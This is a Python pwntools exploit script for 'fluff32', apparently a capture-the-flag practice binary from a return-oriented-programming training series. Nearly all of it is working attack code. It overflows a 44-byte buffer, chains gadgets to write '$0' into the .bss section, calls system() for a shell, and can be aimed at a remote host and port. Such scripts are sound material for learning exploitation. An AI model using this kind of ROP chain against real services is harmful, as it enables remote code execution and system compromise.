#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './fluff32'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# gadget
# push_eax_call_edx = 0x0804856f  # eax -> /bin/sh
clear_edx = 0x08048671 # xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret
set_edx = 0x0804867b # xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
pop_ebx = 0x080483e1 # pop ebx ; ret
xchg_edx_ecx = 0x08048689 # xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret
mov_ecx_edx = 0x08048693  # mov  dword [ecx], edx ; pop  ebp ; pop  ebx ; xor  byte [ecx], bl ; ret
system = 0x0804865a  # call system
bss_base = elf.bss() + 0x200 

offset = 44
payload = 'A'*offset
payload += p32(pop_ebx) + p32(bss_base)        # ebx = bss_base
payload += p32(clear_edx) + p32(0xdeadbeef)    # edx = 0
payload += p32(set_edx) + p32(0xdeadbeef)      # edx = bss_base
payload += p32(xchg_edx_ecx) + p32(0xdeadbeef) # ecx = bss_base
payload += p32(pop_ebx) + '$0\0\0'             # ebx = '$0\0\0'
payload += p32(clear_edx) + p32(0xdeadbeef)    # edx = 0
payload += p32(set_edx) + p32(0xdeadbeef)      # edx = '$0\0\0'
payload += p32(mov_ecx_edx)                    # bss_base <- '$0\0\0'
payload += p32(0x0) + p32(0x0)                 # padding
payload += p32(system) + p32(bss_base) 
# debug()
sl(payload)

p.interactive()

